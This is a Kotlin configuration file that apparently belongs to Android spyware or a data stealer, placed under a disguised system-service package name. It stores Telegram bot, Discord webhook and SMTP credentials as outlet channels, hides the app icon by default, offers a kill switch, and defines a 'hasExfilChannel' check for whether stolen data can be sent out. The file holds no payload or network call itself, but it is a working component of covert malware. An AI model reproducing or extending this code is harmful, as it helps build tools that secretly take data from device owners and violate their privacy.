package com.system.service.core

import android.content.Context
import android.content.SharedPreferences
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

/**
 * Encrypted configuration store — mirrors the desktop Config struct.
 * Uses AndroidX EncryptedSharedPreferences backed by Android Keystore.
 */
object Config {

    private const val PREFS_NAME = "sys_svc_config"
    private lateinit var prefs: SharedPreferences

    // ── Keys ──
    private const val KEY_WEBHOOK_URL = "wh_url"
    private const val KEY_TELEGRAM_TOKEN = "tg_token"
    private const val KEY_TELEGRAM_CHAT_ID = "tg_chat"
    private const val KEY_ENCRYPTION_PASSWORD = "enc_pwd"
    private const val KEY_LOG_LOCAL = "log_local"
    private const val KEY_KILL_SWITCH = "kill_sw"
    private const val KEY_SMTP_HOST = "smtp_host"
    private const val KEY_SMTP_PORT = "smtp_port"
    private const val KEY_SMTP_USER = "smtp_user"
    private const val KEY_SMTP_PASS = "smtp_pass"
    private const val KEY_SMTP_TO = "smtp_to"
    private const val KEY_DOH_ENDPOINT = "doh_ep"
    private const val KEY_IS_CONFIGURED = "configured"
    private const val KEY_HIDE_APP = "hide_app"
    private const val KEY_SYNC_DISCORD_IDX = "sync_dis_idx"
    private const val KEY_SYNC_TG_IDX = "sync_tg_idx"

    fun init(context: Context) {
        val masterKey = MasterKey.Builder(context)
            .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
            .build()

        prefs = EncryptedSharedPreferences.create(
            context,
            PREFS_NAME,
            masterKey,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        )
    }

    // ── Getters ──
    var webhookUrl: String
        get() = prefs.getString(KEY_WEBHOOK_URL, "") ?: ""
        set(value) = prefs.edit().putString(KEY_WEBHOOK_URL, value).apply()

    var telegramToken: String
        get() = prefs.getString(KEY_TELEGRAM_TOKEN, "") ?: ""
        set(value) = prefs.edit().putString(KEY_TELEGRAM_TOKEN, value).apply()

    var telegramChatId: String
        get() = prefs.getString(KEY_TELEGRAM_CHAT_ID, "") ?: ""
        set(value) = prefs.edit().putString(KEY_TELEGRAM_CHAT_ID, value).apply()

    var encryptionPassword: String
        get() = prefs.getString(KEY_ENCRYPTION_PASSWORD, "") ?: ""
        set(value) = prefs.edit().putString(KEY_ENCRYPTION_PASSWORD, value).apply()

    var logLocal: Boolean
        get() = prefs.getBoolean(KEY_LOG_LOCAL, true)
        set(value) = prefs.edit().putBoolean(KEY_LOG_LOCAL, value).apply()

    var killSwitchEnabled: Boolean
        get() = prefs.getBoolean(KEY_KILL_SWITCH, false)
        set(value) = prefs.edit().putBoolean(KEY_KILL_SWITCH, value).apply()

    var smtpHost: String
        get() = prefs.getString(KEY_SMTP_HOST, "") ?: ""
        set(value) = prefs.edit().putString(KEY_SMTP_HOST, value).apply()

    var smtpPort: Int
        get() = prefs.getInt(KEY_SMTP_PORT, 587)
        set(value) = prefs.edit().putInt(KEY_SMTP_PORT, value).apply()

    var smtpUser: String
        get() = prefs.getString(KEY_SMTP_USER, "") ?: ""
        set(value) = prefs.edit().putString(KEY_SMTP_USER, value).apply()

    var smtpPass: String
        get() = prefs.getString(KEY_SMTP_PASS, "") ?: ""
        set(value) = prefs.edit().putString(KEY_SMTP_PASS, value).apply()

    var smtpTo: String
        get() = prefs.getString(KEY_SMTP_TO, "") ?: ""
        set(value) = prefs.edit().putString(KEY_SMTP_TO, value).apply()

    var dohEndpoint: String
        get() = prefs.getString(KEY_DOH_ENDPOINT, "https://cloudflare-dns.com/dns-query") ?: "https://cloudflare-dns.com/dns-query"
        set(value) = prefs.edit().putString(KEY_DOH_ENDPOINT, value).apply()

    var isConfigured: Boolean
        get() = prefs.getBoolean(KEY_IS_CONFIGURED, false)
        set(value) = prefs.edit().putBoolean(KEY_IS_CONFIGURED, value).apply()

    var hideApp: Boolean
        get() = prefs.getBoolean(KEY_HIDE_APP, true)
        set(value) = prefs.edit().putBoolean(KEY_HIDE_APP, value).apply()

    var batteryOptimizationEnabled: Boolean
        get() = prefs.getBoolean("batt_opt_en", true)
        set(value) = prefs.edit().putBoolean("batt_opt_en", value).apply()

    var syncDiscordIdx: Int
        get() = prefs.getInt(KEY_SYNC_DISCORD_IDX, 0)
        set(value) = prefs.edit().putInt(KEY_SYNC_DISCORD_IDX, value).apply()

    var syncTelegramIdx: Int
        get() = prefs.getInt(KEY_SYNC_TG_IDX, 0)
        set(value) = prefs.edit().putInt(KEY_SYNC_TG_IDX, value).apply()

    /** Check if any exfiltration channel is configured */
    fun hasExfilChannel(): Boolean {
        return webhookUrl.isNotBlank() ||
                (telegramToken.isNotBlank() && telegramChatId.isNotBlank()) ||
                (smtpHost.isNotBlank() && smtpUser.isNotBlank())
    }
}
